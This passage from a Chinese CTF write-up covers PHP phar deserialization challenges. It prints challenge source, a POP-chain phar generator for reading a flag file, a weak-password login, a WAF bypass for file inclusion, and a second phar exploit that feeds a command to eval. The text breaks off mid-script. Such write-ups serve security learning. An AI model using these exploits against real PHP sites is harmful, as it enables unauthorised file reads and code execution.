        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br></div></div><p>class.php中又给了这么多类，估计是要考察反序列化，文件上传+反序列化，直接很自然的联想到phar文件。</p> <p>下面看一下有没有什么地方可以触发phar文件的反序列化</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//file.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;content-type:text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token single-quoted-string string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter important">?&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712171614.png" alt="image-20200712171614629"></p> <p>找到file_exists()函数，接下来就是寻找POP链然后生成phar文件了。寻找反序列化的入口__destruct()，该魔术方法仅在C1e4r类中存在，Show类中有__toString()方法，而__destruct()中的<code>echo</code>会触发该方法，所以直接让<code>$this-&gt;str = new Show()</code>即可，str会赋值给test，从而触发__toString()，Test类中有__get()方法，如果让__toString()类中的<code>str['str'] = new Test()</code>，那么str['str']就会访问本类中不存在的成员变量source，从而触发__get()，然后就可以进行文件读取了。</p> <p>生成phar文件：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">C1e4r</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/var/www/html/f1ag.php&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;1.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;1.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;GIF98a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      

<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;test.txt&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p>后缀改成gif进行上传，计算被重命名之后的文件名，然后利用phar协议拿到base64编码之后的f1ag.php，解码即可。</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712173314.png" alt="image-20200712173314801"></p> <h3 id="babysqliv0"><a href="#babysqliv0" class="header-anchor">#</a> BabysqliV0</h3> <p>登录框注了好久结果是弱口令爆破？？我晕，被题目误导了···</p> <p>admin password可以直接登录</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200714211706.png" alt="image-20200714211640995"></p> <p>可能存在文件包含，尝试读一下upload的源码看看：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200714211944.png" alt="image-20200714211944271"></p> <p>这里有点小坑，一开始我的payload是<code>resource=upload.php</code>，结果怎么也绕不了WAF，看来WP才知道是<code>resouce=upload</code>，不过做完题目发现了一个没注意到的细节：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200714212316.png" alt="image-20200714212316184"></p> <p>红线部分是<code>upload.php.</code>，可以看的出第二个<code>.</code>之后的php应该是被WAF掉了，然后第一个<code>.php</code>题目本身自带的，所以直接写<code>resource=upload</code>就行了</p> <p>拿到upload.php的源码：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Content-Type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html; charset=utf-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	上传文件
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>上传<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Uploader</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
	

	<span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;/uploads/&quot;</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;/&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">;</span>
		@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
		<span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;[^a-z0-9]&quot;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;die('illegal filename!');&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;die('you are too big (′▽`〃)');&quot;</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span><span class="token punctuation">{</span>
				<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;move_uploaded_file('&quot;</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;', '&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;');&quot;</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
		<span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
		<span class="token comment">// return $sandbox.$this-&gt;Filename.$ext;</span>
		<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;die('check token falied!');&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$uploader</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span><span class="token punctuation">.</span><span class="token variable">$uploader</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br></div></div><p>文件上传+反序列化，又是考phar文件···这个题目不用找POP链，直接利用__destruct()魔术方法就行</p> <p>生成phar文件的exp：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Uploader</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">token</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;GXYd439ecb8900f38de9127690557ec3a3d&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'highlight_file(&quot;/var/www/html/flag.php&quot;);'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;A.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;A.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;GIF98a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      

